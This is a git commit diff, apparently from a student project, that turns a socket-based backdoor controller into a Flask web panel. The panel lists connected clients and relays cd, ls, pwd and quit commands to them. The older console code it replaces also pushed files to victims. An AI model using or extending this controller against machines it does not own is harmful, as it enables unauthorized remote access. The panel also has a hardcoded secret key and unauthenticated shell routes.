376c1c2c74f1cd3867714b0ac9363ee077279649
Linus Widing <s_widing21@stud.hwr-berlin.de>
2023-06-17 16:50:06 +0200

    Implementing and styling Server Frontend

--- Server/server.py
+++ Server/server.py
@@ -2,91 +2,47 @@ import socket
 import os
 from threading import Thread
 
-HOST = str(os.environ.get("BD_HOST"))
-PORT = int(os.environ.get("BD_PORT"))
-server = socket.socket()
-server.bind((HOST, PORT))
+import models
+
+HOST = "127.0.0.1"  # str(os.environ.get("BD_HOST"))
+PORT = 5004  # int(os.environ.get("BD_PORT"))
+server_socket = socket.socket()
+server_socket.bind((HOST, PORT))
 print('[+] Server Started')
 clients = []
-server.listen(5)
-connected = False
+server_socket.listen(5)
 
 
-def handle_client(cl):
-    wd = cl.recv(1024)
-    wd = wd.decode()
-    while True:
-        userinput = input(wd + " >>")
-        input_list = userinput.split(" ")
-        command = input_list[0]
-        args = input_list.copy()
-        del (args[0])
-        if command == "quit":
-            cl.send(userinput.encode("UTF-8"))
-            break
-        if command == 'pwd':
-            print(wd)
-        elif command == "cd":
-            cl.send(userinput.encode("UTF-8"))
-            output = cl.recv(1024)
-            output = output.decode()
-            if output == "invalid":
-                print("invalid path")
-            else:
-                wd = output
-        elif command == "ls":
-            cl.send(userinput.encode("UTF-8"))
-            output = cl.recv(1024)
-            output = output.decode()
-            print(output)
-        elif command == "send":
-            send_file_path = args[0]
-            send_file_name = args[1]
-            if os.path.isfile(send_file_path):
-                cl.send(userinput.encode("UTF-8"))
-                file = open(send_file_path, "rb")
-                data = file.read()
-                cl.send(send_file_name.encode("UTF-8"))
-                cl.send(data)
-                response = cl.recv(1024)
-                response = response.decode()
-                if response == "failed":
-                    print("Failed!")
-                    print("There is a file named " + send_file_name + " already!")
+def send_command(userinput, client):
+    input_list = userinput.split(" ")
+    command = input_list[0]
+    cl = client.socket
+    print(command)
+    args = input_list.copy()
+    output = ""
+    del (args[0])
+    if command == "quit":
+        cl.send(userinput.encode("UTF-8"))
+    elif command == 'pwd':
+        return client.pwd
+    elif command == "cd":
+        cl.send(userinput.encode("UTF-8"))
+        output = cl.recv(1024).decode()
+        print(output)
+        if not output == "invalid":
+            client.pwd = output
+    elif command == "ls":
+        cl.send(userinput.encode("UTF-8"))
+        output = cl.recv(1024)
+        output = output.decode()
+    return output
 
 
 def listen_for_clients():
     print("[+] Listening for Connections!")
     while True:
-        client, client_addr = server.accept()
+        client, client_addr = server_socket.accept()
         print(f'[+] {client_addr} Client connected to the server')
-        c_dict = {"addr": client_addr,
-                  "socket": client}
-        clients.append(c_dict)
-
-
-def main():
-    # listen for incoming connections
-    thread = Thread(target=listen_for_clients)
-    thread.start()
-
-    print("[+] Enter command! (help for help)")
-    while True:
-        user_in = input("[+] >>")
-        if user_in == "list":
-            for index, c in enumerate(clients):
-                print("{0}     {1}".format("INDEX", "ADDRESS"))
-                print("{0}     {1}".format(index, c["addr"]))
-        elif user_in == "connect":
-            idx = int(input("client index: "))
-            if len(clients) > idx >= 0:
-                print(f"Entering shell on {clients[idx]['addr']}")
-                current_client = clients[idx]["socket"]
-                handle_client(current_client)
-                print("[+] Disconnected successfully!")
-            else:
-                print(f"{idx} out of bounds for length {len(clients)}")
-
-
-if __name__ == "__main__":
-    main()
+        pwd = client.recv(1024).decode()
+        c = models.Client(pwd, client_addr, client)
+        clients.append(c)
---
+++ app.py
@@ -0,0 +1,52 @@
+from threading import Thread
+
+from flask import Flask, session, render_template, redirect, url_for, request
+from Server import server
+
+app = Flask(__name__)
+app.secret_key = "secret"
+
+
+@app.route('/')
+def hello():
+    return redirect(url_for("clients"))
+
+
+@app.route("/clients")
+def clients():
+    return render_template("clients.html", cls=server.clients)
+
+
+@app.route("/shell/<id>", methods=["POST", "GET"])
+def shell(id=-1):
+    id_int = int(id)
+    client = server.clients[id_int]
+    if request.method == "GET":
+        return render_template("shell.html", client=client)
+    else:
+        cmd = request.form["cmd"]
+        output = server.send_command(cmd, client)
+        client.append_output(output)
+        return render_template("shell.html", client=client)
+
+
+@app.route("/listen")
+def listen():
+    if "listening" not in session:
+        thread = Thread(target=server.listen_for_clients)
+        thread.start()
+        session["listening"] = True
+        msg = "Now listening"
+    else:
+        msg = "Already listening"
+    return render_template("listen.html", msg=msg)
+
+
+@app.route("/pop")
+def pop():
+    session.clear()
+    return render_template("pop.html")
+
+
+if __name__ == '__main__':
+    app.run()
